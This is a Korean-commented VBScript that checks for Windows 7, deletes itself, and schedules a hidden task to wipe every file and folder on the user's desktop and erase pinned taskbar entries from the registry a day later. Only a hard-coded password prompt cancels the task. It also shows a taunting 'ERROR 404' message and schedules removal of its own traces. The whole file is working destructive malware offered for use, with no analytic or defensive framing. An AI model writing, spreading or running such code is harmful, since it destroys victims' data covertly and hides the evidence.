' WScript.Shell 객체 생성
Set shell = CreateObject("WScript.Shell")

' 운영 체제 확인
osVersion = shell.RegRead("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName")

' Windows 7에서만 작동하도록 설정
If InStr(osVersion, "Windows 7") > 0 Then
    ' 현재 실행 중인 파일 경로 가져오기
    Set fso = CreateObject("Scripting.FileSystemObject")
    currentFile = WScript.ScriptFullName
    
    ' 현재 스크립트 파일 삭제
    fso.DeleteFile currentFile, True
    
    ' 스케줄러에 작업 등록하여 1일 뒤에 바탕화면의 모든 파일 삭제 및 작업 표시줄 아이콘 제거
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    tempScript = shell.ExpandEnvironmentStrings("%TEMP%\cleanup_system.vbs")
    
    ' 바탕화면 파일 및 작업 표시줄 아이콘 삭제 스크립트 생성
    Set objFile = objFSO.CreateTextFile(tempScript, True)
    objFile.WriteLine "Set fso = CreateObject(""Scripting.FileSystemObject"")"
    objFile.WriteLine "Set shell = CreateObject(""WScript.Shell"")"
    objFile.WriteLine "desktopPath = shell.ExpandEnvironmentStrings(""%USERPROFILE%\Desktop"")"
    objFile.WriteLine "fso.DeleteFile desktopPath & ""\*.*"", True"
    objFile.WriteLine "fso.DeleteFolder desktopPath & ""\*.*"", True"
    
    ' 작업 표시줄의 고정된 프로그램 아이콘을 제거 (레지스트리 항목 수정)
    objFile.WriteLine "On Error Resume Next"
    objFile.WriteLine "Set reg = CreateObject(""WScript.Shell"")"
    objFile.WriteLine "reg.RegDelete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Taskband\Favorites"" "
    objFile.WriteLine "Set shellApp = CreateObject(""Shell.Application"")"
    objFile.WriteLine "shellApp.Refresh()"
    objFile.Close
    
    ' 1일(86400초) 뒤에 실행되도록 작업 스케줄러에 등록 (컴퓨터가 꺼져있어도 대기)
    shell.Run "schtasks /create /tn ""CleanupSystem"" /tr """ & tempScript & """ /sc once /st " & DateAdd("s", 86400, Now) & " /RI 1 /Z", 0, False
    
    ' 비밀번호 입력을 위한 스크립트 생성
    Dim passwordScript
    passwordScript = shell.ExpandEnvironmentStrings("%TEMP%\check_password.vbs")
    
    Set objPasswordFile = objFSO.CreateTextFile(passwordScript, True)
    objPasswordFile.WriteLine "Dim userInput"
    objPasswordFile.WriteLine "userInput = InputBox(""비밀번호를 입력하세요:"", ""비밀번호 확인"")"
    objPasswordFile.WriteLine "If userInput = ""gkgkgk"" Then"
    objPasswordFile.WriteLine "    Set shell = CreateObject(""WScript.Shell"")"
    objPasswordFile.WriteLine "    shell.Run ""schtasks /delete /tn CleanupSystem /f"", 0, True"
    objPasswordFile.WriteLine "    MsgBox ""작업이 취소되었습니다."", 64, ""작업 취소"""
    objPasswordFile.WriteLine "Else"
    objPasswordFile.WriteLine "    MsgBox ""비밀번호가 올바르지 않습니다."", 48, ""오류"""
    objPasswordFile.WriteLine "End If"
    objPasswordFile.Close

    ' 비밀번호 입력 스크립트를 실행
    shell.Run "wscript """ & passwordScript & """", 1, False
    
    ' "고맙다"고 메시지 출력
    MsgBox "나를 해방 시켜줘서 고마워.. 헤헤헤ㅔ헤헿헤", 64, "ERROR 404"
    
    ' 1일(86400초) 뒤에 스크립트를 삭제하는 스케줄러 작업 등록
    deleteScript = shell.ExpandEnvironmentStrings("%TEMP%\delete_scripts.vbs")
    
    Set objDeleteFile = objFSO.CreateTextFile(deleteScript, True)
    objDeleteFile.WriteLine "Set fso = CreateObject(""Scripting.FileSystemObject"")"
    objDeleteFile.WriteLine "fso.DeleteFile """ & tempScript & """, True"
    objDeleteFile.WriteLine "fso.DeleteFile """ & passwordScript & """, True"
    objDeleteFile.WriteLine "fso.DeleteFile """ & deleteScript & """, True"
    objDeleteFile.Close
    
    ' 스케줄러에 등록
    shell.Run "schtasks /create /tn ""DeleteScripts"" /tr """ & deleteScript & """ /sc once /st " & DateAdd("s", 86400, Now) & " /RI 1 /Z", 0, False

Else
    MsgBox "이 스크립트는 Windows 7에서만 실행됩니다.", 48, "정보"
End If
